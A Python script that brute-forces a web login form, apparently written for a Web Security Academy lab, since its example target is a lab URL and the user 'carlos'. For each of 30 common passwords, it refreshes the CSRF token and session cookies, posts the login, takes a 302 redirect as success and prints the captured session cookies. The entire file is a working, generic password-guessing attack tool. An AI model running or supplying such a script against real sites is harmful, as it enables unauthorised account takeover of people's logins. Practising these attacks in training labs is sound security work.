```
#!/usr/bin/env python3
# fetch-and-try.py
# Usage: python3 fetch-and-try.py <TARGET_BASE_URL> <USERNAME>
# Example: python3 fetch-and-try.py "https://0a5100ab0319c54281d38a4c00640038.web-security-academy.net" carlos

import sys
import re
import httpx
from typing import Optional, Tuple

WORDLIST = [
    "123123","abc123","football","monkey","letmein","shadow","master",
    "666666","qwertyuiop","123321","mustang","123456","password",
    "12345678","qwerty","123456789","12345","1234","111111","1234567",
    "dragon","1234567890","michael","x654321","superman","1qaz2wsx",
    "baseball","7777777","121212","000000"
]

CSRF_RE = re.compile(r'name=["\']?csrf["\']?\s+value=["\']([^"\']+)["\']', re.IGNORECASE)

def get_csrf_and_cookies(client: httpx.Client, login_url: str) -> Tuple[Optional[str], dict]:
    r = client.get(login_url)
    r.raise_for_status()
    m = CSRF_RE.search(r.text)
    csrf = m.group(1) if m else None
    cookies = {k: v for k, v in client.cookies.items()}
    return csrf, cookies

def try_login(client: httpx.Client, login_url: str, username: str, password: str, csrf: Optional[str]) -> httpx.Response:
    data = {}
    if csrf is not None:
        data["csrf"] = csrf
    data["username"] = username
    data["password"] = password

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": login_url,
        "User-Agent": "fetch-and-try/1.0"
    }

    # use follow_redirects instead of allow_redirects
    r = client.post(login_url, data=data, headers=headers, follow_redirects=False, timeout=15.0)
    return r

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 fetch-and-try.py <TARGET_BASE_URL> <USERNAME>")
        sys.exit(1)

    base = sys.argv[1].rstrip("/")
    username = sys.argv[2]
    login_path = "/login"
    login_url = base + login_path

    try:
        for pw in WORDLIST:
            with httpx.Client(http2=True, follow_redirects=False, timeout=15.0) as c:
                try:
                    csrf, cookies = get_csrf_and_cookies(c, login_url)
                except Exception as e:
                    print(f"[!] Failed to GET login page: {e}")
                    return

                print(f"[+] Trying password: {pw} (csrf={'present' if csrf else 'missing'})")
                try:
                    resp = try_login(c, login_url, username, pw, csrf)
                except httpx.HTTPError as e:
                    print(f"[!] HTTP error during login attempt: {e}")
                    return

                status = resp.status_code
                if status == 302:
                    location = resp.headers.get("Location", "")
                    print(f"[!] SUCCESS: password='{pw}' -> HTTP 302 Redirect to {location}")
                    sess_cookies = {k: v for k, v in c.cookies.items()}
                    print("[*] Session cookies:", sess_cookies)
                    return
                else:
                    print(f"[-] {pw} -> {status}")
        print("[*] Exhausted wordlist without finding a 302 response.")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")

if __name__ == "__main__":
    main()

```